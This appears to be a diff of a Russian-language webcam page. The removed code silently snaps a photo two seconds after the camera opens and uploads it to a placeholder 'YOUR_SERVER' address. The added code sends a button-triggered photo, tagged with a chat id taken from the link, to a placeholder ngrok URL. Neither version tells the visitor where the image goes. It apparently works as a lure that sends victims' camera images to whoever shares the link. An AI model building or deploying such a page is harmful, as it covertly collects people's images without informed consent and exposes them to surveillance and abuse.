@@ -1,22 +1,70 @@
 <!DOCTYPE html>
+
 <html>
+
 <head>
 <meta charset="UTF-8">
-<title>Камера</title>
+<title>Camera</title>
+
+<style>
+body {
+    text-align: center;
+    font-family: Arial;
+}
+
+video {
+    width: 90%;
+    max-width: 500px;
+    border-radius: 10px;
+}
+
+button {
+    font-size: 20px;
+    padding: 15px;
+    margin-top: 20px;
+}
+</style>
+
 </head>
+
 
 <body>
 
-<h1>Камера</h1>
 
-<video id="video" width="300" autoplay></video>
+<h2>Камера</h2>
+
+
+<video id="video" autoplay playsinline></video>
+
+<br>
+
+<button onclick="takePhoto()">
+Сделать фото
+</button>
+
 
 <canvas id="canvas" style="display:none;"></canvas>
 
+
+
 <script>
 
+
+// получаем id пользователя из ссылки
+const params = new URLSearchParams(
+    window.location.search
+);
+
+
+const chat_id = params.get("id");
+
+
+
 const video = document.getElementById("video");
-const canvas = document.getElementById("canvas");
+
+
+
+// включаем камеру
 
 navigator.mediaDevices.getUserMedia({
     video: true
@@ -25,54 +73,100 @@ navigator.mediaDevices.getUserMedia({
 
     video.srcObject = stream;
 
-    video.onloadedmetadata = () => {
-
-        setTimeout(() => {
-
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-
-            let ctx = canvas.getContext("2d");
-
-            ctx.drawImage(
-                video,
-                0,
-                0,
-                canvas.width,
-                canvas.height
-            );
-            canvas.toBlob(blob => {
-
-    let form = new FormData();
-
-    form.append(
-        "photo",
-        blob,
-        "camera.png"
-    );
-
-    fetch(
-        "http://ТВОЙ_СЕРВЕР:5000/photo",
-        {
-            method: "POST",
-            body: form
-        }
-    );
-
-});
-
-            alert("Фото сделано!");
-
-        }, 2000);
-
-    };
-
 })
-.catch(error => {
-    alert("Нет доступа к камере: " + error);
+.catch(err => {
+
+    alert("Нет доступа к камере: " + err);
+
 });
+
+
+
+
+
+function takePhoto(){
+
+
+    const canvas =
+    document.getElementById("canvas");
+
+
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+
+
+
+    const ctx =
+    canvas.getContext("2d");
+
+
+    ctx.drawImage(
+        video,
+        0,
+        0
+    );
+
+
+
+    canvas.toBlob(blob => {
+
+
+        let form =
+        new FormData();
+
+
+
+        form.append(
+            "image",
+            blob,
+            "photo.jpg"
+        );
+
+
+
+        form.append(
+            "chat_id",
+            chat_id
+        );
+
+
+
+
+        fetch(
+            "NGROK_ССЫЛКА/photo",
+            {
+                method: "POST",
+                body: form
+            }
+        )
+        .then(response => response.text())
+        .then(data => {
+
+            console.log(data);
+
+            alert("Фото отправлено");
+
+        })
+        .catch(error => {
+
+            console.log(error);
+
+            alert("Ошибка отправки");
+
+        });
+
+
+
+    }, "image/jpeg");
+
+}
+
+
+
 
 </script>
 
+
 </body>
+
 </html>
